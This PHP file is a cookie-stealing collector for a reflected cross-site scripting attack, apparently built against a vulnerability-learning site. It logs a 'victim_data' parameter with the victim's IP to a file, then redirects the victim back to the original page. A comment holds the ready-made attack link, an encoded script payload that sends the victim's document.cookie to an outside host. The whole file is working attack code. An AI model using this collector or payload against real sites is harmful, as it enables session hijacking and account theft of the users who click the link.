<?php 

//This document take the victim_data variable and log it. 

$victim_data = $_GET['victim_data'] . " | {$_SERVER['REMOTE_ADDR']}"; //Get the victim data.

file_put_contents('bazinga_cookie.txt', $victim_data. PHP_EOL, FILE_APPEND | LOCK_EX); //Put the fetched data taken by victim to log file.

header("location: http://learnvul.com/XSS/XSS01/reflected_xss.php");  //redirect use to the original site.


//Link to be sent: 
//http://learnvul.com/XSS/XSS01/reflected_xss_01_processor.php?search_word=%3Cscript%3Elocation.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie%3C/script%3E&Ara=G%C3%B6nder

?> 

